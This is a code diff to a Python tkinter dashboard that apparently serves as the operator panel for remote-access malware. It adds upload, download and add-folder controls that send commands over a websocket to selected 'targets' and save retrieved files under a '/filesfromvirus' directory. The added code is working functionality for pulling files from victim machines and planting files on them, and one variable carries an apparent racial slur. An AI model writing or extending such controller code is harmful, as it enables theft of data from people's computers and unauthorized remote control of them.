@@ -1,8 +1,9 @@
 import tkinter as tk
-from tkinter import ttk
+from tkinter import ttk,filedialog, messagebox
 import threading
 import json
 import base64
+import os
 import time
 import websocket
 from io import BytesIO
@@ -65,6 +66,15 @@ class ViewerDashboard(tk.Tk):
         self.delete_btn = tk.Button(ops_frame, text="🗑️ Delete", bg="#c0392b", fg="white", font=("Arial", 9), relief=tk.FLAT, command=self._on_delete_click)
         self.delete_btn.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=(2, 0))
 
+        self.add_folder_btn = tk.Button(ops_frame, text="📂 Add Folder", bg="#ff8800", fg="white", font=("Arial", 9), relief=tk.FLAT, command=self._on_add_folder_click)
+        self.add_folder_btn.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=(3, 0))
+
+        self.upload_file_btn = tk.Button(ops_frame, text="Upload File", bg="#008cff", fg="white", font=("Arial", 9), relief=tk.FLAT, command=self._on_upload_file_click)
+        self.upload_file_btn.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=(3, 0))
+
+        self.download_file = tk.Button(ops_frame, text="Download File", bg="#CC06CC", fg="white", font=("Arial", 9), relief=tk.FLAT, command=self._on_download_file_click)
+        self.download_file.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=(3, 0))
+
         self.refresh_files_btn = tk.Button(
             self.file_frame, text="🔄 Refresh Current Window", 
             bg="#2e4053", fg="white", font=("Arial", 9, "bold"), relief=tk.FLAT,
@@ -118,6 +128,27 @@ class ViewerDashboard(tk.Tk):
                             "path": payload.get("path", ""),
                             "files": payload.get("files", [])
                         }
+                    elif p_type == "file_recv":
+                        print("try to recieve")
+                        target_name = payload.get("user")
+                        if target_name == self.selected_target:
+                            filename = payload.get("filename", "")
+                            base64_data = payload.get("data_b64", "")
+                            if filename and base64_data:
+                                nig = f"/filesfromvirus/{target_name}/downloads/"
+                                if not os.path.exists(nig):
+                                    os.makedirs(nig)
+
+                                dst = os.path.join(nig, filename)
+                                try:
+                                    print("attempt")
+                                    # 1. Reverse the conversion: Translate the text-safe Base64 string back into binary bytes
+                                    decoded_bytes = base64.b64decode(base64_data)
+                                    
+                                    # 2. Write the binary bytes directly onto the recipient disk ('wb')
+                                    with open(dst, "wb") as dst:
+                                        dst.write(decoded_bytes)
+                                except Exception as e: print(e)
             except Exception as e:
                 time.sleep(5)
 
@@ -220,6 +251,89 @@ class ViewerDashboard(tk.Tk):
                 "target_path": self.current_remote_path,
                 "item_name": item_clean
             }))
+
+    def _on_add_folder_click(self):
+        if self.selected_target and self.ws:
+            dialog = tk.Toplevel(self)
+            dialog.title("Add Folder")
+            dialog.geometry("300x120")
+            dialog.resizable(False, False)
+            
+            ttk.Label(dialog, text=f"Folder Name:").pack(pady=5)
+            entry = ttk.Entry(dialog, width=30)
+            entry.pack(pady=5)
+            entry.insert(0, "")
+            
+            def submit():
+                name = entry.get().strip()
+                self.ws.send(json.dumps({
+                        "type": "viewer_frame",
+                        "target": self.selected_target,
+                        "command": "add_folder",
+                        "target_path": self.current_remote_path,
+                        "name": name
+                    }))
+                dialog.destroy()
+                
+            ttk.Button(dialog, text="Apply Changes", command=submit).pack(pady=5)
+
+    def _on_download_file_click(self):
+        selection = self.file_listbox.curselection()
+        if selection and self.selected_target and self.ws:
+            selected_item = self.file_listbox.get(selection[0])
+            # Strip whatever emoji type prefix exists (folder or file)
+            item_clean = selected_item.replace("📁 ", "").replace("📄 ", "")
+            
+            self.ws.send(json.dumps({
+                "type": "viewer_frame",
+                "target": self.selected_target,
+                "command": "download_item",
+                "target_path": self.current_remote_path,
+                "item_name": item_clean
+            }))
+
+    def _on_upload_file_click(self):
+        if self.selected_target and self.ws:
+            file_path = filedialog.askopenfilename(
+                title="Select File to Transmit",
+                filetypes=[("All Files", "*.*")]
+            )
+            
+            # If the user cancels the prompt window, safely exit
+            if not file_path:
+                return
+                
+            file_name = os.path.basename(file_path)
+            #self.title.config(text=f"Selected: {file_name}")
+
+            try:
+                # 2. Read the file completely into memory as raw binary bytes ('rb')
+                with open(file_path, "rb") as file:
+                    raw_bytes = file.read()
+                    
+                # 3. Convert the raw binary data into a clean text-safe Base64 string
+                # .decode('utf-8') turns the bytes-like base64 into a pure printable string
+                base64_string = base64.b64encode(raw_bytes).decode("utf-8")
+                
+                # 4. Construct your structural payload to send over WebSockets
+                
+                # --- SIMULATION SECTION ---
+                # Instead of a live websocket connection, let's simulate the recipient 
+                # receiving this JSON payload data and saving it to disk automatically.
+                print(f"[Sender] Encoded {file_name} into Base64 string (Length: {len(base64_string)} chars)")
+                # ---------------------------
+
+                self.ws.send(json.dumps({
+                    "type": "viewer_frame",
+                    "target": self.selected_target,
+                    "command": "add_file",
+                    "target_path": self.current_remote_path,
+                    "filename": file_name,
+                    "data_b64": base64_string
+                }))
+                
+            except Exception as e:
+                messagebox.showerror("Error", f"Failed to process file:\n{e}")
 
     def _on_rename_click(self):
         selection = self.file_listbox.curselection()
